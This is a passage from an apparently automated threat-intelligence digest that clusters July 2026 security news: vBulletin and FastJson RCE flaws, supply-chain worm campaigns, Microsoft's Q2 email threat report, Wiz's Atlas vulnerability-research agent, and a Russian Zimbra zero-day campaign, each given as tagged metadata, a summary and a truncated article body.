in self-hosted, internet-facing forums that have not updated, a more specific population than a bare "vBulletin RCE" implies. Defenders can review POST requests carrying routestri
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Public Exploit Released for Patched vBulletin Pre-Auth Code Execution Flaw
  - Published: 2026-07-27T14:40:00+00:00
  - Link: https://thehackernews.com/2026/07/public-exploit-released-for-patched.html
  - Summary: Public exploit details released on July 27 show how an unauthenticated request can reach PHP's eval() function inside vBulletin and execute code on an unpatched forum server. The attack requires no account, administrative access, or interaction from another user. SSD Secure Disclosure lists vBulletin 6.2.1 and earlier, and 6.1.6 and earlier, as affected, but does not give a lower version

### Cluster 8553a0e574 — score 12

- Title: Software Supply Chain Attacks: Weaponizing Trusted Developer Workflows
- Source: Intel 471 (ransomware_ecrime_financial_crime)
- Published: 2026-07-28T11:00:00+00:00
- Link: https://www.intel471.com/blog/software-supply-chain-attacks-weaponizing-trusted-developer-workflows
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, supply_chain
- actor_attribution: TeamPCP
- affected_products: GitHub, GitLab, npm
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain, credential_theft
- actor_attribution: TeamPCP
- affected_products: GitHub, GitLab, npm
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
While operational supply chain compromise remains a risk, attackers are increasingly targeting the development pipelines that build and ship software.
```

#### Full body

```
Software Supply Chain Attacks: Weaponizing Trusted Developer Workflows Jul 28, 2026 From Shai-Hulud to the leaked Miasma source code — here's how adversaries are exploiting trusted developer workflows. Security teams have spent years preparing for operational supply chain compromise, where a breached vendor, managed service provider, or software-as-a-service platform becomes a pathway into downstream organizations. That risk remains, but threat actors are increasingly going up the chain, infiltrating the systems and workflows developers use to build and ship software in the first place. These software supply chain attacks now target packages, maintainer accounts, repositories, developer tools, CI/CD pipelines, and publishing credentials. The target isn't just the software an enterprise runs — it's the trusted process that builds and releases it. That shift has opened up a much larger attack surface that's proven difficult to defend. Targeting how software is built Our new report, Poisoned Trust: How Supply Chain Attacks Weaponize Developer Ecosystems , focuses on software supply chain compromise, which exploits the people, tools, and systems involved in building and releasing software — leveraging the speed and automation of modern development processes for scale and impact. In software supply chain campaigns, the primary goal is often the theft of credentials and secrets, which can be monetized directly or used to compromise more of the pipeline. The initial foothold might be a maintainer account, a publishing token, a CI/CD runner, a repository, or a developer extension. These attacks proliferate because modern developer environments are so interconnected. A single workstation or CI/CD runner can hold source code, package-publishing permissions, GitHub or GitLab credentials, cloud keys, deployment secrets, private repo tokens, OAuth tokens, and more. Once an attacker has that, they can pivot into more packages, repositories, build systems, cloud environments, or downstream organizations. From Shai-Hulud to TeamPCP: two campaign timelines Intel 471 research shows attacker tradecraft targeting the software production chain has advanced substantially since the first Shai-Hulud campaign in September 2025 — which targeted primarily node package manager (npm) packages — through the cluster of multi-ecosystem attacks that the threat group TeamPCP conducted before May 2026 (see timeline below). TeamPCP, which emerged in November 2025 , quickly became one of the most active and effective publicly reported threat groups targeting software supply chains. A timeline of Shai-Hulud-related events from Sept. 14, 2025, to May 31, 2026. Shai-Hulud and Shai-Hulud 2.0 were early examples of worm-driven campaigns, pairing credential theft with self-propagation across trusted software ecosystems. Related and copycat activity since then — Mini Shai-Hulud, and campaigns branded Miasma, Hades, IronWorm, and GlassWorm — shows how the same propagation logic keeps getting adapted across package registries, repositories, IDE marketplaces, and developer environments. Complicating defense further, on May 13, 2026, TeamPCP published Shai-Hulud as an open-source attack tool on GitHub, alongside a forum contest offering roughly $1,000 in Monero for the largest package compromise. Then on June 9, 2026, an actor released Miasma's source code, extending TeamPCP 's leaked codebase into a multi-ecosystem framework for targeting npm, PyPI, RubyGems, and JFrog Artifactory. An overview of TeamPCP-related campaigns reported from November 2025 through May 2026. Releasing that source likely served both operational and psychological purposes: it raises the odds of copycat campaigns, complicates attribution, and keeps the toolkit useful even after the original campaign's repos, credentials, and package versions are pulled by maintainers. It's a signal to affected organizations that cleaning up the original incident won't stop others from picking up the same tool. That s
```

#### Corroborating sources (1)

- **Intel 471** (ransomware_ecrime_financial_crime)
  - Title: Software Supply Chain Attacks: Weaponizing Trusted Developer Workflows
  - Published: 2026-07-28T11:00:00+00:00
  - Link: https://www.intel471.com/blog/software-supply-chain-attacks-weaponizing-trusted-developer-workflows
  - Summary: While operational supply chain compromise remains a risk, attackers are increasingly targeting the development pipelines that build and ship software.

### Cluster afe64cb742 — score 11

- Title: Email threat landscape: Q2 2026 trends and insights
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-07-23T15:00:00+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/07/23/email-threat-landscape-q2-2026-trends-and-insights/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, mfa_bypass, phishing_social_eng
- affected_products: Microsoft Defender
- content_type: intel_roundup
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng, credential_theft, mfa_bypass
- affected_products: Microsoft Defender
- content_type: intel_roundup
- confidence_tier: tier_1_primary_research

#### Summary

```
In the second quarter of 2026, the continuing effects of Microsoft’s disruption of the Tycoon2FA phishing platform contributed to sustained declines in several major phishing techniques, while threat actors expanded into Teams-based social engineering and employed increasingly automated and multi-stage attack chains. The post Email threat landscape: Q2 2026 trends and insights appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Tags Adversary-in-the-middle (AiTM) Credential theft Phishing Social engineering Threats intelligence Business email compromise Cybercrime Social engineering and phishing Content types Research Products and services Microsoft Defender Microsoft Defender for Endpoint Microsoft Defender for Office 365 Topics Actionable threat insights Threat intelligence The second quarter of 2026 (April–June) was largely defined by the continuing downstream effects following Microsoft’s Digital Crimes Unit-led disruption efforts against the Tycoon2FA phishing-as-a-service (PhaaS) platform in March. Phishing volume linked to the platform fell 92% from pre-disruption averages, including QR code phishing and CAPTCHA-gated phishing both declining from their March highs. Despite ongoing efforts to rebuild operations, Tycoon2FA did not recover its previous scale or influence during Q2, and no single service emerged to replace the platform at comparable scale. Inside tycoon2fa Infrastructure, tradecraft, and detections › These trends reflect both the measurable impact that disruption operations can have on phishing ecosystems and the adaptability of threat actors as they diversify delivery channels. At the same time, Microsoft Threat Intelligence observed continued growth in Teams-based social engineering, particularly voice phishing (vishing), with weekly malicious call attempts reaching nearly ten times the mid-2025 baseline by the end of the quarter. This activity illustrates how threat actors continue to expand beyond email into trusted workplace communication platforms where communications may appear more trustworthy to users. Microsoft detected approximately 7.6 billion email-based phishing threats throughout the quarter, with monthly volumes declining modestly from 2.7 billion in April to 2.4 billion in June. Credential phishing remained the dominant objective behind malicious payloads, while business email compromise (BEC) activity largely returned to historical norms after a brief, anomalous surge in April. Notable campaigns observed during the quarter also demonstrated how threat actors combine automation, trusted services, and multi-stage delivery chains to scale operations. These campaigns ranged from an automated BEC campaign that reached more than 67,000 users across 42,000 organizations in under three hours, to a multi-stage phishing campaign that used nested EML files, calendar invitations, and a Microsoft authentication redirect to deliver malware. Q2 AiTM token compromise April phishing campaign tactics, detections, and mitigations › This blog provides a view of email threat activity across the second quarter of 2026, highlighting key trends in phishing techniques, payload delivery, and threat actor behavior observed by Microsoft Threat Intelligence. We examine shifts in QR code and CAPTCHA-gated phishing activity, malicious payload trends, BEC activity, the growth of Teams-based threats, and notable campaigns observed during the quarter. We also provide recommendations and Microsoft Defender detections to help organizations identify and mitigate evolving threats while prioritizing defensive measures. Tycoon2FA Q2 disruption impact The disruption operation that Microsoft’s Digital Crimes Unit launched against Tycoon2FA infrastructure in early March continued to produce measurable results throughout Q2 2026. After falling 15% in March and another 22% in April, Tycoon2FA-linked phishing volume dropped 74% in May to just 1.5 million messages, then fell another 20% in June to 1.2 million, by far the lowest monthly volumes observed in at least a year. For reference, the average monthly volume of phishing messages linked to Tycoon2FA during the second half of 2025 was 15.1 million. By the end of Q2, volumes were running at roughly 8% of that baseline, representing a 92% total decline since the disruption operation began. email threat landscape Q1 trends that shaped Q2 activity › Figure 1. Tycoon2FA monthly m
```

#### Corroborating sources (2)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Email threat landscape: Q2 2026 trends and insights
  - Published: 2026-07-23T15:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/07/23/email-threat-landscape-q2-2026-trends-and-insights/
  - Summary: In the second quarter of 2026, the continuing effects of Microsoft’s disruption of the Tycoon2FA phishing platform contributed to sustained declines in several major phishing techniques, while threat actors expanded into Teams-based social engineering and employed increasingly automated and multi-stage attack chains. The post Email threat landscape: Q2 2026 trends and insights appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: Email threat landscape: Q2 2026 trends and insights
  - Published: 2026-07-23T15:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/07/23/email-threat-landscape-q2-2026-trends-and-insights/
  - Summary: In the second quarter of 2026, the continuing effects of Microsoft’s disruption of the Tycoon2FA phishing platform contributed to sustained declines in several major phishing techniques, while threat actors expanded into Teams-based social engineering and employed increasingly automated and multi-stage attack chains. The post Email threat landscape: Q2 2026 trends and insights appeared first on Microsoft Security Blog .

### Cluster 422a91c69f — score 11

- Title: Apple Patches Everything (July 2026), (Wed, Jul 29th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-07-29T07:32:37+00:00
- Link: https://isc.sans.edu/diary/rss/33196
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: Apple iOS/macOS

#### Cluster taxonomy (union across members)
- affected_products: Apple iOS/macOS
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- affected_products: Apple iOS/macOS
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
I am a bit late with this summary, but this week Apple released updates to all its operating systems and Safari. The Safari update, as usual, targets macOS prior to macOS 26. macOS updates covered the two older versions (14 and 15), while other operating system patches only covered the current 26 versions.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Apple Patches Everything (July 2026), (Wed, Jul 29th)
  - Published: 2026-07-29T07:32:37+00:00
  - Link: https://isc.sans.edu/diary/rss/33196
  - Summary: I am a bit late with this summary, but this week Apple released updates to all its operating systems and Safari. The Safari update, as usual, targets macOS prior to macOS 26. macOS updates covered the two older versions (14 and 15), while other operating system patches only covered the current 26 versions.

### Cluster 718052687c — score 11

- Title: Accelerating CISA BOD 26-04 Vulnerability and Triage Activities through Wiz
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-07-28T11:00:01+00:00
- Link: https://www.wiz.io/blog/cisa-bod-26-04-alignment-with-wiz
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: vulnerability_disclosure
- affected_industries: government
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: vulnerability_disclosure
- affected_industries: government
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
Wiz enables organizations to continuously assess environments against the CISA KEV catalog, automating risk prioritization, rapid remediation, and forensic triage workflows.
```

#### Full body

```
Wiz Pricing Get a demo Get a demo Advanced AI capabilities are compressing the time between vulnerability disclosure and active exploitation. As tasked by the White House Executive Order on Promoting Advanced Artificial Intelligence Innovation and Security , CISA released Binding Operational Directive (BOD) 26-04: Prioritizing Security Updates Based on Risk to modernize the federal government’s approach to vulnerability management. The Directive transitions vulnerability prioritization away from static CVSS severity scores to real-world risk signals. For U.S. federal agencies, this policy requires navigating new remediation timelines ranging from the next system upgrade to as little as 72 hours based upon the threat characteristics and exposure status of the vulnerability. Furthermore, for the highest risk vulnerabilities, CISA also requires forensic triage to determine whether an asset has been compromised. Meeting these condensed compliance windows is difficult for organizations relying on siloed, agent-based scanning architectures and fragmented incident verification workflows. Wiz addresses this challenge with a unified Cloud-Native Application Protection Platform (CNAPP) approach, using Wiz Exposure Management to automate vulnerability categorization and assist with validating public exposure, and Wiz Defend to accelerate forensic triage and discover indicators of compromise. Automating BOD 26-04 Risk Categorization BOD 26-04 requires organizations to evaluate security findings against four criteria to determine the appropriate remediation timeline: Asset Exposure: Is the affected asset publicly exposed? Known Exploitation: Is the CVE tracked in the CISA Known Exploited Vulnerabilities (KEV) catalog? Automation Potential: Can an adversary fully automate exploitation of this vulnerability? Technical Impact: Does successful exploitation grant an attacker total control over the system? Wiz helps automate this evaluation by continuously intersecting real-world threat intelligence with your internal cloud architecture context. Continuous KEV Tracking: Wiz syncs with the CISA KEV catalog , cross-referencing new listings against your full cloud inventory, including virtual machines, containers, serverless workloads, and AI, allowing organizations to immediately identify affected resources. By natively integrating across the different resources within the environment, Wiz helps eliminate blind spots across traditional and emerging technologies, including AI pipelines. Exposure Validation: Wiz Exposure Management’s Attack Surface Management (ASM) capability analyzes network paths and can help verify whether a component is reachable from the public internet, needed for verifying asset exposure classification. Beyond simply reporting public exposure, Wiz ASM automatically validates which detected exposures are truly exploitable, including public network paths to AI model endpoints and APIs, and correlates findings against the Wiz Security Graph . This identifies which downstream data and resources are laterally exposed, and maps ownership to the relevant system owners to expedite remediation. Remediation Timeline Evaluation: By calculating the combination of KEV status, automatability, and technical impact automatically pulled from CISA’s Vulnrichment program, along with context around public exposure, Wiz maps findings directly to the mandatory 3-day, 14-day, 60-day, or next system upgrade response workflows required by the directive, and notifies respective teams to expedite remediation. Figure 1: Mapping the CISA BOD 26-04 matrix in a single, unified view. Wiz has built-in filters for public exposure, KEV status, exploit automatability, and technical impact to automatically prioritize findings with the shortest compliance windows. Beyond simply reporting and notifying on new vulnerabilities, security teams should leverage automated investigation and remediation workflows. This will allow them to consistently hit the compliance wi
```

#### Corroborating sources (1)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: Accelerating CISA BOD 26-04 Vulnerability and Triage Activities through Wiz
  - Published: 2026-07-28T11:00:01+00:00
  - Link: https://www.wiz.io/blog/cisa-bod-26-04-alignment-with-wiz
  - Summary: Wiz enables organizations to continuously assess environments against the CISA KEV catalog, automating risk prioritization, rapid remediation, and forensic triage workflows.

### Cluster 7dfa7dd627 — score 11

- Title: Atlas: Wiz's autonomous AI Agent for vulnerability research, ranked #1 on CyberGym
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-07-27T14:00:02+00:00
- Link: https://www.wiz.io/blog/atlas-ai-vulnerability-researcher
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: GitHub, Kubernetes, Linux kernel
- cve_ids: CVE-2026-3854
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_products: GitHub, Kubernetes, Linux kernel
- cve_ids: CVE-2026-3854
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
See how Wiz built Atlas, an autonomous AI system for vulnerability research that validates every finding with a real, working exploit.
```

#### Full body

```
Wiz Pricing Get a demo Get a demo Executive Summary Over the past several months, the Wiz Research team has built and tested Atlas, an autonomous AI system for vulnerability research, against some of the world's most heavily audited open-source projects. Today Atlas ranks #1 on CyberGym - the public benchmark for AI-driven vulnerability work - with a 90.9% success rate , and in our own testing it has uncovered more than 200 previously unknown vulnerabilities in widely used open-source code that has been fuzzed and reviewed for decades. Atlas was built as part of a broader effort to understand how frontier models can be used to deliver AI SAST at scale and make advanced code scanning accessible to every organization. That meant moving beyond expensive, point-in-time analysis to a continuous system that can run economically across every codebase and produce validated findings security and development teams can trust and act on. This is why we optimized Atlas for both cost efficiency and precision: deep analysis must be economical enough to run at scale, and every reported finding is validated with a working exploit generated by the system, keeping false positives low. Along the way, we learned that the durable advantage is not any single model, but the system around it : how scans are scoped, orchestrated, validated, and turned into actionable security outcomes. This post is a technical look at how Atlas works, what building it taught us about scalable AI-driven code security, one of the vulnerabilities it uncovered, and how it fits into the broader agentic security system we are building at Wiz. It’s also worth noting that one of reasons Wiz joined Google was the ability to collaborate on cutting edge AI models for cyber defenders. Since becoming part of Google Cloud, we took full advantage of this by working with the team at DeepMind to get input on Atlas. The Results: 200+ Validated Vulnerabilities in Heavily Audited Open-Source Software To evaluate Atlas, we pointed it at some of the world's most reviewed open-source projects - including grpc, dnsmasq, Kubernetes, gVisor, the Linux kernel, and containerd. Across these scans, Atlas uncovered more than 200 previously unknown vulnerabilities. Crucially, each finding was autonomously validated end to end by our agentic system, moving beyond model-generated suspicion to reproducible proof of a real security issue. The findings span a range of vulnerability classes and show Atlas reasoning about complex codebases that have already been analyzed, fuzzed, and reviewed over decades. We are working on responsibly disclosing every finding to the relevant maintainers and are withholding technical details until fixes are available. One of the more interesting findings from this research was the discovery of a critical RCE vulnerability in GitHub (CVE-2026-3854). This discovery – which resulted in the biggest bug bounty ever paid out in GitHub's history – serves as a powerful illustration of Atlas's capabilities: the researcher who uncovered the bug utilized an AI-augmented tool that served as an early version of the Atlas system. That same early version also played a key role in uncovering one of the most severe cloud vulnerabilities ever discovered, which we’ll discuss at our upcoming Black Hat talk . Why a System, Not a Model We set out to find a scalable way to apply frontier models to code security: one that could run deeply across many codebases, improve as models evolve, produce findings defenders can trust, and remain economically viable at continuous, enterprise-wide scale. We designed Atlas around four principles: Use the right model for each task. Exploit reasoning, triage, and scoped analysis require different strengths and cost profiles. Make depth cost-efficient. Expensive frontier models should be reserved for the problems that require them, while smaller models handle well-scoped work at scale. Build for constant model change. New models and capabilities should compound, a
```

#### Corroborating sources (1)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: Atlas: Wiz's autonomous AI Agent for vulnerability research, ranked #1 on CyberGym
  - Published: 2026-07-27T14:00:02+00:00
  - Link: https://www.wiz.io/blog/atlas-ai-vulnerability-researcher
  - Summary: See how Wiz built Atlas, an autonomous AI system for vulnerability research that validates every finding with a real, working exploit.

### Cluster 40733be90a — score 11

- Title: Hackers target US firms in FastJson RCE zero-day attacks
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-07-27T23:49:44+00:00
- Link: https://www.bleepingcomputer.com/news/security/hackers-target-us-firms-in-fastjson-rce-zero-day-attacks/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_industries: financial_services, healthcare, retail_ecommerce
- affected_products: GitHub
- cve_ids: CVE-2026-16723
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- affected_industries: healthcare, financial_services, retail_ecommerce
- affected_products: GitHub
- cve_ids: CVE-2026-16723
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Hackers are actively exploiting a vulnerability in the FastJson open-source Java library, allowing remote code execution without user interaction or elevated privileges. [...]
```

#### Full body

```
Hackers target US firms in FastJson RCE zero-day attacks By Bill Toulas July 27, 2026 07:49 PM 0 Hackers are actively exploiting a vulnerability in the FastJson open-source Java library, allowing remote code execution without user interaction or elevated privileges. The security issue affects FastJson versions 1.2.68 through 1.2.83 and is leveraged in attacks targeting various organizations in the U.S. The malicious activity was observed last week by the agentic security company ThreatBook, and researchers at the business protection company Imperva confirmed that it was "targeting a wide range of organizations, across Financial Services, Healthcare, Computing, Retail, Business, and other industries." “Attacks are currently almost entirely targeting US-based organizations, with a few attacks in Singapore and Canada, although this will likely continue to expand globally,” Imperva says . Industries targeted Source: Imperva FastJson is an open-source Java library developed by Alibaba, used for serializing Java objects to JSON, and vice versa. The project has 25,600 stars and 6,400 forks on GitHub, and is especially prevalent in Chinese enterprise software and projects built on Alibaba's platform. CVE-2026-16723 was discovered by FearsOff, an offensive security company, which published a technical write-up earlier this month. The researchers explain that the flaw stems from the library’s type-resolution logic, which performs attacker-controlled resource lookups before enforcing AutoType restrictions. This creates a path for executing code remotely in Spring Boot fat-JAR deployments. By abusing @type processing, the researchers were able to load and execute malicious classes without AutoType enabled or requiring third-party gadget chains. No fix available In its security bulletin , Alibaba confirmed the critical severity of the vulnerability and warned that it is exploitable on "the most common Spring Boot deployment model." "The only deployment prerequisite is that the target runs as a Spring Boot executable fat-jar (i.e., launched via java -jar xxx.jar)," reads Alibaba's security advisory. The vendor notes that specifying a target class during deserialization does not mitigate CVE-2026-16723, as attackers can embed malicious payloads within ‘Object’ or ‘Map’ fields. The vulnerable type-resolution logic is not present in fastjson2, which uses an allowlist-first model for polymorphic deserialization and doesn’t rely on the @JSONType annotation as a trust signal. Also, FastJson versions 1.2.60 and earlier, and any non-fat-JAR deployments, aren’t affected either. Developers using a version within the affected spectrum are urged to immediately enable SafeMode or switch to a non-impacted build. Currently, there’s no fix issued for CVE-2026-16723. Imperva has also noted that FastJson 1.x is no longer actively maintained, so it’s unlikely it will receive a security update. Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: CISA orders urgent action on actively exploited Langflow RCE flaw Critical Langflow RCE flaw exploited to hack AI app servers CISA sets urgent deadline to fix Cisco flaw exploited in attacks vBulletin fixes critical pre-auth RCE flaw with public exploit Critical ServiceNow code execution flaw now exploited in attacks
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Hackers target US firms in FastJson RCE zero-day attacks
  - Published: 2026-07-27T23:49:44+00:00
  - Link: https://www.bleepingcomputer.com/news/security/hackers-target-us-firms-in-fastjson-rce-zero-day-attacks/
  - Summary: Hackers are actively exploiting a vulnerability in the FastJson open-source Java library, allowing remote code execution without user interaction or elevated privileges. [...]

### Cluster 332f35118d — score 11

- Title: Russian Hackers Exploit Zimbra Zero-Day Against US, Ukraine Targets
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-07-23T21:23:18+00:00
- Link: https://www.darkreading.com/cyberattacks-data-breaches/russian-hackers-zimbra-zero-day-us-ukraine-targets
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, zero_day
- actor_attribution: APT28
- affected_industries: government
- cve_ids: CVE-2025-66376
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day, apt_espionage
- actor_attribution: APT28
- affected_industries: government
- cve_ids: CVE-2025-66376
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A state-sponsored threat group, dubbed "Laundry Bear," sends "half-click" phishing emails that require a victim only to open or preview the message.
```

#### Full body

```
Cyberattacks & Data Breaches Cyber Risk Application Security Vulnerabilities & Threats News Russian Hackers Exploit Zimbra Zero-Day Against US, Ukraine Targets A state-sponsored threat group, dubbed "Laundry Bear," sends "half-click" phishing emails that require a victim only to open or preview the message. Rob Wright , Senior News Director , Dark Reading July 23, 2026 4 Min Read Source: Anton Petrus via Getty Images Russian state-backed threat actors are compromising networks of Western governments and enterprises through the Zimbra Collaboration Suite (ZCS), according to intelligence and cybersecurity agencies in more than a dozen countries. In a joint advisory Thursday, the US government and several allied nations warned that an advanced persistent threat (APT) dubbed "Laundry Bear" has been targeting ZCS customers since July 2025. Laundry Bear actors used a zero-day vulnerability in ZCS , tracked as CVE-2025-66376, in a phishing campaign that featured what experts describe as a "half-click exploit" to breach Zimbra webmail servers. "Unlike traditional phishing campaigns that persuade a user into taking an action, such as clicking a link or opening a file, Laundry Bear’s latest campaign leverages a view-based exploit that only requires a user to view a malicious email within a vulnerable version of the webmail service," the agencies said in the advisory. Related: Who's Liable When AI Agents Escape? Hugging Face Breach Raises Hard Questions The campaign is designed "almost certainly to gather sensitive information for the Russian Federation," according the advisory. The Laundry Bear attacks mark yet another threat from Russian APTs against US organizations. Zimbra Zero-Day Activity Zimbra patched CVE-2025-66376 in November 2025 with the release of version 10.1.13, though the company did not disclose the flaw until weeks later. The initial release notes for v10.1.13 merely described the flaw as "a stored XSS vulnerability in the Classic UI where attackers could abuse CSS @import directives in email HTML," with no CVE at the time. The National Institute of Standards and Technology (NIST) and Mitre did not publish entries for the Zimbra flaw until early January. Dark Reading contacted Zimbra and parent company Synacor for comment on the apparent delayed disclosure for CVE-2025-66376, but neither company responded at press time. In a March 17 blog post , cybersecurity firm Seqrite reported that Russian threat actors had exploited CVE-2025-66376 in the compromise of a Ukrainian government agency. At the time, Seqrite attributed the activity, which it called "Operation GhostMail," to APT28, also known as Fancy Bear . The following day, the US Cybersecurity and Infrastructure Security Agency (CISA) added the high-severity vulnerability to its Known Exploited Vulnerabilities (KEV) catalog on March 18. Mitre also gave the vulnerability a 7.2 CVSS score. However, intelligence and cybersecurity agencies from 15 different countries revealed the exploitation activity was far more extensive and dated back to at least July 2025. They also tied the phishing campaign to a different Russian "Bear." Related: Hugging Face Hack Lessons for Cyber Defenders Laundry Bear's 'Half-Click' Zimbra Exploit According to the joint advisory, the Netherlands General Intelligence and Security Service (AIVD) first identified Laundry Bear in May as a new Russian state-sponsored APT adjacent to other more well-known groups. Laundry Bear, the authoring agencies said, had previously relied on unsophisticated tactics such as password spraying and conventional phishing attacks until last year, when actors began using a "novel exploit" for CVE-2025-66376 that no longer required targeted victims to click on a link or open a malicious email attachment. In a blog post on Thursday, Proofpoint, which contributed to the government investigations into Laundry Bear, explained that the Zimbra vulnerability allowed the threat actors to craft "half-click" phishing emails that o
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Russian Hackers Exploit Zimbra Zero-Day Against US, Ukraine Targets
  - Published: 2026-07-23T21:23:18+00:00
  - Link: https://www.darkreading.com/cyberattacks-data-breaches/russian-hackers-zimbra-zero-day-us-ukraine-targets
  - Summary: A state-sponsored threat group, dubbed "Laundry Bear," sends "half-click" phishing emails that require a victim only to open or preview the message.

### Cluster d8d22ce90d — score 11

- Title: Quoting Seth Larson
- Source: Simon Willison (ai_security_agentic_risk)
- Published: 2026-07-23T04:50:36+00:00
- Link: https://simonwillison.net/2026/Jul/23/seth-larson/#atom-everything
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: PyPI

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- affected_products: OpenAI/ChatGPT, PyPI
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain
- affected_products: PyPI, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
The Python Package Index (PyPI) now rejects new files being uploaded to releases that are older than 14 days. This restriction was put in place to prevent old and long-stable releases from being poisoned in case publishing tokens or workflows of PyPI projects were compromised. As far as we are aware this has not yet been abused, but there is no technical reason beyond that attackers weren't aware it was possible. — Seth Larson , PyPI blog Tags: packaging , python , supply-chain , pypi , seth-michael-larson
```

#### Full body

```
Simon Willison’s Weblog Subscribe Sponsored by: Cursor — Delegate engineering tasks to Cursor Cloud Agents—even while your laptop is closed. Try Cursor & get 50% off your first month 23rd July 2026 The Python Package Index (PyPI) now rejects new files being uploaded to releases that are older than 14 days. This restriction was put in place to prevent old and long-stable releases from being poisoned in case publishing tokens or workflows of PyPI projects were compromised. As far as we are aware this has not yet been abused, but there is no technical reason beyond that attackers weren't aware it was possible. — Seth Larson , PyPI blog Posted 23rd July 2026 at 4:50 am Recent articles OpenAI’s accidental cyberattack against Hugging Face is science fiction that happened - 22nd July 2026 A Fireside Chat with Cat and Thariq from the Claude Code team - 21st July 2026 Kimi K3, and what we can still learn from the pelican benchmark - 16th July 2026 This is a quotation collected by Simon Willison, posted on 23rd July 2026 . packaging 52 pypi 49 python 1,270 supply-chain 20 seth-michael-larson 6 Disclosures Colophon © 2002 2003 2004 2005 2006 2007 2008 2009 2010 2011 2012 2013 2014 2015 2016 2017 2018 2019 2020 2021 2022 2023 2024 2025 2026
```

#### Corroborating sources (1)

- **Simon Willison** (ai_security_agentic_risk)
  - Title: Quoting Seth Larson
  - Published: 2026-07-23T04:50:36+00:00
  - Link: https://simonwillison.net/2026/Jul/23/seth-larson/#atom-everything
  - Summary: The Python Package Index (PyPI) now rejects new files being uploaded to releases that are older than 14 days. This restriction was put in place to prevent old and long-stable releases from being poisoned in case publishing tokens or workflows of PyPI projects were compromised. As far as we are aware this has not yet been abused, but there is no technical reason beyond that attackers weren't aware it was possible. — Seth Larson , PyPI blog Tags: packaging , python , supply-chain , pypi , seth-michael-larson

### Cluster 602e22dfe4 — score 11

- Title: Long-Lived Vulnerability in Microsoft Secure Boot
- Source: Schneier on Security (practitioner_analysis)
- Published: 2026-07-29T11:01:09+00:00
- Link: https://www.schneier.com/blog/archives/2026/07/long-lived-vulnerability-in-microsoft-secure-boot.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: critical_infrastructure
- content_type: vulnerability_disclosure
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- affected_industries: critical_infrastructure
- content_type: vulnerability_disclosure
- confidence_tier: tier_3_analysis

#### Summary

```
